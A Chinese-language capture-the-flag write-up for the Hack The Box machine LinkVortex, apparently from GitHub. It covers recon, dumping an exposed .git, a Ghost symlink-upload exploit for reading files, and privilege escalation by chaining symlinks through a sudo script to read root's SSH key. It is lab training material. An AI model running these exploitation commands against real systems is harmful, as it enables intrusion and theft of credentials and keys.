## 1. 執行摘要 (Executive Summary)

### 測試範圍與目標：
1. 靶機名稱:LinkVortex
2. 難度:Easy
3. IP:

### 主要發現：
1. 漏洞 ：（風險等級：）
2. 漏洞 ：（風險等級：）

### 攻擊鏈摘要：

### 潛在影響：

### 修復建議：

---

## 2. 技術發現與攻擊路徑詳述 (Findings)

### 2.1 資訊蒐集(Reconnaissance)

使用Nmap掃描開放埠
```bash
sudo nmap -sT -Pn --min-rate 5000 10.129.231.194
sudo nmap -sT -Pn -sV -sC -O -p99,22,80 10.129.231.194
sudo nmap --script=vuln -p22,80 10.129.231.194
```

<img width="764" height="248" alt="螢幕擷取畫面 2026-03-24 173917" src="https://github.com/user-attachments/assets/cd0a61ab-9fc4-4c98-8542-f7ba13472cf6" />
<img width="1117" height="482" alt="螢幕擷取畫面 2026-03-24 173929" src="https://github.com/user-attachments/assets/8eb9a252-f482-4af4-b09b-31fd5ec7108e" />
<img width="608" height="301" alt="螢幕擷取畫面 2026-03-24 174111" src="https://github.com/user-attachments/assets/08a0cd8a-5855-4dac-a90a-b7c6c01c8f54" />

將獲得的網域名加入/etc/hosts
```bash
sudo vim /etc/hosts
```
<img width="505" height="245" alt="螢幕擷取畫面 2026-03-24 174124" src="https://github.com/user-attachments/assets/1086acc6-9242-4ea9-a704-eda6ea9e65aa" />

探索80主頁

(包含各分頁、原始碼、whatweb、curl、JS等信息，並未有新訊息)

<img width="1837" height="847" alt="螢幕擷取畫面 2026-03-25 133009" src="https://github.com/user-attachments/assets/15eb3613-0547-44b2-9329-b52533e12936" />



### 2.2 枚舉(Enumeration)

使用Gobuster枚舉目錄
```bash
sudo gobuster dir -u http://linkvortex.htb -w /usr/share/wordlists/dirb/common.txt --exclude-length 0
```

有時伺服器會將不存在的目錄自動補上斜線並跳轉，例如回傳301，且長度為0，這會讓Gobuster誤以為每個路徑都存在，使其報錯，這時只要 --exclude-length 0 排除掉長度為0 或 -b 301 排除狀態碼為301 的目錄即可。

我的習慣是我不太願意放棄301頁面，因為這可能會影響我對這個網站的整體地圖，而且也不是沒碰過攻擊面在301目錄裡的。

<img width="975" height="520" alt="螢幕擷取畫面 2026-03-24 175025" src="https://github.com/user-attachments/assets/1de2f908-4210-4227-9fb8-0178abfb388b" />

檢查各目錄

robots.txt，其中有一些目錄，進入/ghost會跳轉到登入頁面

<img width="886" height="245" alt="螢幕擷取畫面 2026-03-24 175103" src="https://github.com/user-attachments/assets/1eb94b34-ad8a-4b3e-883d-14446291b7f2" />
<img width="1247" height="776" alt="螢幕擷取畫面 2026-03-24 175104" src="https://github.com/user-attachments/assets/7fa1b162-c68a-46a0-8f7f-fe7c717b327f" />

其他頁面並沒有太大用處，有些能下載的我還是會下載，檢查有沒有隱寫訊息或內藏檔案，非CTF類靶機可以簡單檢查就好，OSCP類應該不太會有，即使有也不會藏太深，有機會打CTF類靶機再深入說明。

<img width="1317" height="581" alt="螢幕擷取畫面 2026-03-24 175143" src="https://github.com/user-attachments/assets/2cc5e396-baaf-4a72-84b6-cb84f73e7d0f" />
<img width="1404" height="252" alt="螢幕擷取畫面 2026-03-24 175227" src="https://github.com/user-attachments/assets/22cce615-7014-411a-9bd6-4d6e5041bc1a" />
<img width="1028" height="810" alt="螢幕擷取畫面 2026-03-24 175257" src="https://github.com/user-attachments/assets/3c39d7ec-4f07-4aeb-a992-45dbec7cfdec" />
<img width="838" height="791" alt="螢幕擷取畫面 2026-03-24 175816" src="https://github.com/user-attachments/assets/79ac1341-ca0c-4612-a145-5f2ffc38ca8c" />
<img width="610" height="554" alt="螢幕擷取畫面 2026-03-24 180045" src="https://github.com/user-attachments/assets/4afafec5-163b-49d8-b094-c242d1e6b695" />

因為沒有什麼有用資訊，我嘗試爆破子網域，用-mc all -ac篩選
```bash
sudo ffuf -u http://10.129.231.194 -H "HOST: FUZZ.linkvortex.htb" -w /user/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc all -ac
```

<img width="1459" height="532" alt="螢幕擷取畫面 2026-03-24 180646" src="https://github.com/user-attachments/assets/2b0be0d3-ce8d-4e22-b199-77f3d55fd703" />

將dev加入/etc/hosts
```bash
sudo vim /etc/hosts
```

<img width="536" height="259" alt="螢幕擷取畫面 2026-03-24 180755" src="https://github.com/user-attachments/assets/d5e321c9-2c4d-4801-bad8-6d77374bc502" />

檢查dev子網域

<img width="1038" height="814" alt="螢幕擷取畫面 2026-03-24 180837" src="https://github.com/user-attachments/assets/dcf7a7f4-07d7-4851-85bc-e3417eb9e377" />

使用Gobuster枚舉目錄

```bash
sudo gobuster dir -u http://dev.linkvortex.htb -w /usr/share/wordlists/dirb/common.txt --exclude-length 0
```

<img width="1015" height="554" alt="螢幕擷取畫面 2026-03-24 181420" src="https://github.com/user-attachments/assets/5caf74d6-fb2b-4fe2-a918-c28a6f343c08" />

獲得/.git分頁

<img width="907" height="612" alt="螢幕擷取畫面 2026-03-24 181448" src="https://github.com/user-attachments/assets/a4de31a7-2068-40ac-b671-c9543603a0d9" />

使用git-dumper下載git內容
```bash
git-dumper http://dev.linkvortex.htb/.git/ gitcopy
```
<img width="676" height="384" alt="螢幕擷取畫面 2026-03-24 183707" src="https://github.com/user-attachments/assets/b5453ea1-67bb-464b-b17e-a44ed34b1aff" />
<img width="1007" height="136" alt="螢幕擷取畫面 2026-03-24 183803" src="https://github.com/user-attachments/assets/4ca5de72-405c-4261-8699-074a9d5c69cd" />

在面對git資料時，千萬不要一個一個檔案找，要善用git指令
```bash
git status //狀態查詢
git diff --cached //查看已暫存變更
git diff --staged //同上，1.6.1 版本後
git log //查看所有日誌
git show // 查看特定提交的內容
```

查詢狀態後了解到兩個有變更的檔案

<img width="782" height="166" alt="螢幕擷取畫面 2026-03-24 184236" src="https://github.com/user-attachments/assets/7b1212a7-a31e-4fd4-adb0-42e1c6795e79" />

第一個檔案了解到版本訊息、有一些內在目錄可備用

<img width="1397" height="478" alt="螢幕擷取畫面 2026-03-24 184358" src="https://github.com/user-attachments/assets/b23a138d-e169-4f18-9fab-cc38d48e98e5" />

第二個檔案有密碼更改紀錄

<img width="1241" height="304" alt="螢幕擷取畫面 2026-03-24 184420" src="https://github.com/user-attachments/assets/47888c84-fa8b-47e6-ab48-d1cbdb9f69a3" />


### 2.3 初始存取(Initial Access)

嘗試利用洩漏的密碼登入，用戶名原本是直接複製git檔案裡的，發現無法登入，才用80主頁中找到的admin用戶名登入

<img width="869" height="685" alt="螢幕擷取畫面 2026-03-24 184535" src="https://github.com/user-attachments/assets/fff30ace-b749-4b40-a631-3f1f36ba88f4" />

有一個Dashboard

<img width="1899" height="863" alt="螢幕擷取畫面 2026-03-24 184553" src="https://github.com/user-attachments/assets/fab3d909-82a7-4af0-94ac-35772fbb6829" />

查詢版本漏洞

<img width="823" height="782" alt="螢幕擷取畫面 2026-03-24 184919" src="https://github.com/user-attachments/assets/4accdb04-bad4-47f6-b19b-50362f2410a9" />
<img width="1317" height="765" alt="螢幕擷取畫面 2026-03-24 185202" src="https://github.com/user-attachments/assets/20d848a6-c70a-4c1d-85e5-18804f6b73a3" />

CVE-2203-40028是「允許"已認證使用者"上傳符號連結檔案」的漏洞，可以在Ghost的官網找到上傳路徑和呼叫路徑，或是利用Brup Suite攔截上傳請求來獲得路徑。

關於這個漏洞的利用，我會示範手動利用，但我建議使用公開PoC腳本，因為每個符號連結檔案只能讀取一個檔案，若不是很確定想要的目標，會反覆操作很多次。網路上已經有很多很好用的公開腳本，只要輸入想看的檔案，腳本就能自動完成。

以下示範手動利用過程:

建立符號連結檔
```bash
ln -s /etc/hosts passwd.png
```

<img width="646" height="246" alt="螢幕擷取畫面 2026-03-24 192405" src="https://github.com/user-attachments/assets/0dbb4664-a2a9-477a-994a-bb48f3de0295" />

將符號連結檔壓縮成zip
```bash
zip --symlinks exploit.zip passwd.png
```

<img width="653" height="288" alt="螢幕擷取畫面 2026-03-24 192412" src="https://github.com/user-attachments/assets/65be4cb5-38af-46cc-8530-f109daf422b5" />

用curl上傳檔案，因為只允許已驗證的使用者上傳，需要帶Cookie，又或者直接利用管理頁面的上傳功能，已試過可通
```bash
curl http://linkvortex.htb/ghost/api/admin/db -F "importfile=@exploit.zip" --cookie 'ghost-admin-api-session=...'
```

<img width="1761" height="76" alt="螢幕擷取畫面 2026-03-24 192435" src="https://github.com/user-attachments/assets/6469a163-369b-4af6-b997-b286937892d7" />

用curl讀取這個檔案，一樣要帶cookie
```bash
curl --cookie 'ghost-admin-api-session=...' http://linkvortex.htb/content/images/passwd.png
```

<img width="1554" height="426" alt="螢幕擷取畫面 2026-03-24 192502" src="https://github.com/user-attachments/assets/047e255d-6472-409e-8713-5003156f8a1c" />

PoC成功，正式開始利用，我將符號連結設成當初在git查到版本訊息的那個檔案裡提過的路徑，步驟都相同

設定符號連結檔案，並壓縮成zip

<img width="901" height="333" alt="螢幕擷取畫面 2026-03-24 193504" src="https://github.com/user-attachments/assets/a31d832f-eb6e-43fb-859f-10cefda7a89d" />

用curl上傳zip檔

<img width="1762" height="68" alt="螢幕擷取畫面 2026-03-24 193549" src="https://github.com/user-attachments/assets/aa5ed20f-f992-4aa4-a744-4345a3ca6f69" />

用curl讀取檔案

<img width="1588" height="472" alt="螢幕擷取畫面 2026-03-24 193558" src="https://github.com/user-attachments/assets/9098f06d-9b40-4003-9933-ace290e88092" />

檔案中有憑證

<img width="421" height="294" alt="螢幕擷取畫面 2026-03-24 193607" src="https://github.com/user-attachments/assets/2a37cb15-5247-47bc-9fc5-ea13dea238e1" />

嘗試SSH連線成功

<img width="762" height="405" alt="螢幕擷取畫面 2026-03-24 193651" src="https://github.com/user-attachments/assets/dd6d6422-b10d-40ee-8284-538d8f25d5c1" />

獲得user.txt

<img width="374" height="187" alt="螢幕擷取畫面 2026-03-24 193734" src="https://github.com/user-attachments/assets/2611b59e-0be6-4225-b116-0950a6c20f85" />



### 2.4 權限提升(Privilege Escalation)

檢查sudo權限

<img width="1378" height="132" alt="螢幕擷取畫面 2026-03-24 193815" src="https://github.com/user-attachments/assets/394a980c-870c-4347-a2cd-6d0c42c427fb" />

檢查腳本內容

<img width="720" height="591" alt="螢幕擷取畫面 2026-03-24 194008" src="https://github.com/user-attachments/assets/d67afc71-472e-438b-96d3-ed4a4aec186d" />

腳本內容簡單來說就是檢查並處理系統中的符號連結，將可疑的連結移至隔離區：

1. 輸入的第一個參數必須以 .png 結尾。
2. 使用test -L檢查該檔案是否為符號連結。
3. 如果連結指向的路徑包含etc或root，腳本會警告並直接刪除。
4. 如果檢查通過，腳本會將連結移動到隔離區/var/quarantined/。
5. 如果環境變數$CHECK_CONTENT為真，它會執行cat檔案內容。

這個腳本總共有三種漏洞：

1. TOCTOU，這是一種競爭條件漏洞，是「檢查」和「使用」有時間差，利用這個時間差做事，同時這也是HTB官方建議的漏洞。
2. 命令注入漏洞，$CHECK_CONTENT並未被引號妥善保護，直接針對其注入bash命令可獲得root shell。
3. 邏輯漏洞，檢查的連結並未進行遞歸檢查，只要多層連結即可指向敏感文件。


我在打靶機的時候使用的是第三種漏洞，因為第一種要使用while true; do 去無限循環，會產生大量噪音，而且要開兩個終端機，甚至有可能失敗。

第二種漏洞只要CHECK_CONTENT=bash sudo ...就可以了，可以嘗試一下。

以下展示第三種漏洞

建立兩個符號連結檔案，第一個連結向root的SSH金鑰(指向/etc/shadow後破解哈希也可以，$6$通常是sha-512，丟給john處理就行)，第二個指向第一個
```bash
ln -s /root/.ssh/id_rsa /home/bob/safe
ln -s /home/bob/safe /tmp/exploit.png
```

<img width="525" height="40" alt="螢幕擷取畫面 2026-03-24 195941" src="https://github.com/user-attachments/assets/bc30da9a-1866-433b-8c3e-146370a03b54" />

以sudo權限呼叫腳本，獲得SSH金鑰
```bash
CHECK_CONTENT=true sudo /usr/bin/bash /opt/ghost/clean_symlink.sh /tmp/exploit.png
```

<img width="911" height="795" alt="螢幕擷取畫面 2026-03-24 200023" src="https://github.com/user-attachments/assets/db6962fd-1e9c-46a4-a0dc-144848080e2a" />

儲存金鑰成檔案並賦予權限600
```bash
vim root_key
chmod 600 root_key
```

<img width="307" height="125" alt="螢幕擷取畫面 2026-03-24 200130" src="https://github.com/user-attachments/assets/693d8c5c-160f-4331-88ac-5ee2f4c40aed" />

透過SSH連線到root


<img width="1095" height="333" alt="螢幕擷取畫面 2026-03-24 200250" src="https://github.com/user-attachments/assets/797c8bdc-1e71-441b-953c-200560f41f9e" />



### 2.5 最終成果(Impact)

獲得root.txt


<img width="1200" height="220" alt="螢幕擷取畫面 2026-03-24 200408" src="https://github.com/user-attachments/assets/20186ef9-ad3b-4062-b37d-d172f70b67ea" />




---

## 3. 學習回顧 (Lessons Learned)

### 成功的部分：
### 浪費時間的部分：
### 新知識點：
### 與實戰對應：
